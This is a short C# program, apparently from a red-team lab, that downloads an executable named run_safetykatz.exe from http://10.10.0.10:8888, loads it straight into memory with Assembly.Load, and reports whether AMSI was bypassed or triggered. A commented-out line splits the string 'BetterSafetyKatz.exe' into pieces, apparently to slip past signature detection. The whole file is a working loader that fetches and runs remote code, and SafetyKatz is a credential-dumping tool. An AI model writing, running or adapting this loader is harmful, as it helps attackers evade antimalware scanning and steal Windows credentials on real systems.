using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Runtime.InteropServices;

namespace RunSafetyKatz
{   
    class Program
    {


        static void Main(string[] args)
        {

            var webClient = new System.Net.WebClient();
            // var data = webClient.DownloadData("http://10.10.0.10:8888/Better"+"Safe"+"tyK"+"atz.exe");
            var data = webClient.DownloadData("http://10.10.0.10:8888/run_safetykatz.exe");
            try
            {
                Console.WriteLine("Before loading the assembly. Press any button to continue...");
                Console.ReadKey();

                var assembly = Assembly.Load(data);

                Console.WriteLine("After loading the assembly. Press any button to continue...");
                Console.ReadKey();

                if (assembly != null)
                {
                    Console.WriteLine("[*] AMSI bypassed");
                    Console.WriteLine("[*] Assembly Name: {0}", assembly.FullName);
                }
            }
            catch (BadImageFormatException e)
            {
                Console.WriteLine("[x] AMSI Triggered on loading assembly");

            }
            catch (System.Exception e)
            {
                Console.WriteLine("[x] Unexpected exception triggered");
            }
        }

    }
}